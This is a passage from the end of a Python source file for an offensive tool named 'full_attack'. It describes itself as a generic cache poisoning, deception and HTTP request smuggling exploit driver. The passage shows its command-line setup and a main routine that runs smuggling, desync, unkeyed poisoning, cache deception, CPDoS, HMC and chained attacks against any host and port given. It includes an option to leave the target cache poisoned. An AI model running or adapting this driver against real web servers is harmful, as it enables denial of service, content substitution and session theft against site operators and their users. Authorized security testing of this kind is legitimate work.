                print(C.dim("        | " + line.replace("\n", "\\n").replace("\x00", "\\0")))
            print()
        if self.keep:
            print(C.warn("  --keep set: cache left in its last attacked state."))
        else:
            self.t.drop_cache()
            print(C.dim("  cache restored (/drop)."))


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #

ALL_TECH = ["smuggle", "desync", "poison", "deception", "cpdos", "hmc", "chain"]


# Fallback defaults used when neither the CLI nor a --from-recon file supplies a value.
# Host/port are never hardcoded — pass them per run (or via --from-recon) so the tool
# works against any authorized target. No cookie is shipped either: supply your own
# with --cookie, via the recon file, or answer the interactive prompt.
DEFAULTS = {
    "host": None, "port": None,
    "cookie": None,
    "target": "/login", "source": "/join", "drop_path": "/drop",
}


def load_recon(path):
    """Read a full_recon.py --json dump. Returns the parsed dict (or exits on error)."""
    try:
        with open(path, encoding="utf-8") as fh:
            return json.load(fh)
    except (OSError, ValueError) as e:
        sys.exit(f"error: could not read recon file {path!r}: {e}")


def main():
    ap = argparse.ArgumentParser(
        description="Generic cache poisoning/deception/smuggling exploit driver "
                    "(authorized use only). Companion to full_recon.py.")
    # Overridable connection/scope args default to None so we can tell whether the
    # user set them explicitly; precedence is: CLI > --from-recon file > DEFAULTS.
    ap.add_argument("--host", help="target host/IP (or supply via --from-recon)")
    ap.add_argument("--port", type=int, help="target port (or supply via --from-recon)")
    ap.add_argument("--cookie",
                    help="Cookie header value (auth/session token). If omitted and "
                         "not loaded from --from-recon, you'll be asked whether the "
                         'target needs one. Use --cookie "" to force no cookie.')
    ap.add_argument("--target", help="endpoint to poison/attack")
    ap.add_argument("--source",
                    help="a different page whose body proves content substitution")
    ap.add_argument("--drop-path", help="cache-flush endpoint ('' if none)")
    ap.add_argument("--from-recon", metavar="PATH",
                    help="load target/source/connection from a full_recon.py --json dump; "
                         "any explicit flag still overrides it")
    ap.add_argument("--tech", default="all",
                    help=f"comma list of techniques to run: {','.join(ALL_TECH)} (or 'all')")
    ap.add_argument("--retries", type=int, default=6,
                    help="attempts per race-sensitive carrier")
    ap.add_argument("--aggressive", action="store_true",
                    help="full obfuscation/X-CL sweep + don't stop at first hit")
    ap.add_argument("--keep", action="store_true",
                    help="do NOT restore the cache after attacks (leave it poisoned)")
    ap.add_argument("--verbose", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()

    if args.no_color or not sys.stdout.isatty():
        C.on = False

    # Resolve config: explicit CLI value wins, else recon file, else hardcoded default.
    recon = load_recon(args.from_recon) if args.from_recon else {}
    best = recon.get("best") or {}

    def pick(name, recon_key=None, from_best=False):
        if getattr(args, name) is not None:
            return getattr(args, name)
        if from_best and best.get(recon_key or name) is not None:
            return best[recon_key or name]
        if recon_key and recon.get(recon_key) is not None:
            return recon[recon_key]
        return DEFAULTS[name]

    host = pick("host", "host")
    port = pick("port", "port")
    if host is None or port is None:
        sys.exit("error: target not set. Pass --host and --port, or load them with "
                 "--from-recon <file> from a full_recon.py run.")
    cookie = pick("cookie", "cookie")
    if cookie is None:                      # nothing on CLI or in the recon file
        cookie = resolve_cookie(None)       # ask interactively (or "" if non-interactive)
    drop_path = args.drop_path if args.drop_path is not None else \
        recon.get("drop_path", DEFAULTS["drop_path"])
    target = pick("target", "target", from_best=True)
    source = pick("source", "source", from_best=True)

    if args.from_recon:
        print(C.dim(f"loaded recon: {args.from_recon}"))
        if best:
            print(C.dim(f"  best target={best.get('target')} (score {best.get('score')}), "
                        f"suggested source={best.get('source')}"))

    techs = ALL_TECH if args.tech == "all" else [x.strip() for x in args.tech.split(",")]
    t = Target(host, port, cookie, drop_path)
    atk = Attacker(t, target, source, cookie, args.retries,
                   args.aggressive, args.keep, args.verbose)

    print(C.hdr(f"\nfull_attack -> {host}:{port}  target={target} source={source}"))
    print(C.dim(f"techniques: {', '.join(techs)}   "
                f"{'AGGRESSIVE' if args.aggressive else 'standard'} sweep"))

    atk.baseline()
    if "smuggle" in techs:
        atk.smuggle_and_poison()
    if "desync" in techs:
        atk.desync_timing()
    if "poison" in techs:
        atk.poison_unkeyed()
    if "deception" in techs:
        atk.deception()
    if "cpdos" in techs:
        atk.cpdos()
    if "hmc" in techs:
        atk.hmc()
    if "chain" in techs:          # run last: reuses primitives the others discovered
        atk.chain()
    atk.report()
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\ninterrupted.")
